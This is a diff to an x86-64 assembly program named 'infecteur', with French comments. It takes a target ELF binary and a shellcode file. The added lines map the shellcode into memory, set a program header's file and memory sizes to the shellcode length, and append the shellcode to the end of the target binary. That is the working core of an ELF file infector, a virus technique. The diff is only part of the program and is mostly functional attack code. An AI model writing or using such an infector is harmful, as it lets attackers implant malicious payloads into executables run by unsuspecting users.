@@ -17,7 +17,7 @@ default rel
 %define P_ALIGN     0x30
 %define P_PHDR_SIZE 56
 
-; --- types ---
+; types
 %define PT_NOTE 4
 %define PT_LOAD 1
 %define PF_R    4
@@ -26,8 +26,6 @@ default rel
 section .data
     msg_usage db "Usage: ./infecteur <elf> <shellcode.bin>", 10
     msg_usage_len equ $ - msg_usage
-    msg_found db "PT_NOTE trouve", 10   ; message de debug
-    msg_found_len equ $ - msg_found     ; longueur
 
 section .bss
     fd: resq 1 ; on réserve 8 octets pour stocker le file descriptor
@@ -116,14 +114,35 @@ _start:
     syscall
     mov r15, rax ; r15 = taille du shellcode
 
-    mov rax, 1  ; syscall write
-    mov rdi, 1  ; stdout
-    lea rsi, [msg_found]    ; message
-    mov rdx, msg_found_len  ; longueur
+    xor rdi, rdi ; addr = NULL
+    mov rsi, r15 ; taille du shellcode
+    mov rdx, 1 ; PROT_READ
+    mov r10, 2 ; MAP_PRIVATE
+    mov r8, r14 ; fd du shellcode
+    xor r9, r9 ; offset 0
+    mov rax, 9 ; syscall mmap
+    syscall
+    mov r13, rax ; r13 = pointeur vers le shellcode
+    mov [rbx + P_FILESZ], r15 ; filesz = taille du shellcode
+    mov [rbx + P_MEMSZ], r15 ; memsz = taille du shellcode
+
+
+    ; append du shellcode
+    mov rdi, [fd] ; fd du binaire cible
+    xor rsi, rsi
+    mov rdx, 2
+    mov rax, 8 ; syscall lseek
     syscall
 
-    mov rax, 60 ; syscall exit
-    xor rdi, rdi        ; code de retour 0 (succes)
+    mov rdi, [fd]                  
+    mov rsi, r13 ; pointeur vers le shellcode
+    mov rdx, r15 ; taille du shellcode
+    mov rax, 1
+    syscall
+
+    ; exit(0)
+    mov rax, 60
+    xor rdi, rdi
     syscall
 
 .exit_ok:
